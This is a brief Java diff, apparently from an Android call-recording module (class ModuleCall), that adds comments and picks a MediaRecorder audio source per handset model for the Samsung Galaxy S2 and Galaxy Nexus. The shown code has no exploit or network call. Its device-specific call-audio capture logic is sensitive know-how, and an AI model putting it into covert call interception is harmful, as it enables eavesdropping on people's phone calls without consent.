@@ -334,16 +334,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
 		}
 		
-		if (model.contains("i9100")) {
+		if (model.contains("i9100")) { // Samsung Galaxy S2
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains("galaxy nexus")){
+		} else if (model.contains("galaxy nexus")){ // Samsung Galaxy Nexus
 			supported = true;
-			//strategy = MediaRecorder.AudioSource.MIC;
 			strategy = MediaRecorder.AudioSource.DEFAULT;
 			
 			if (Cfg.DEBUG) {
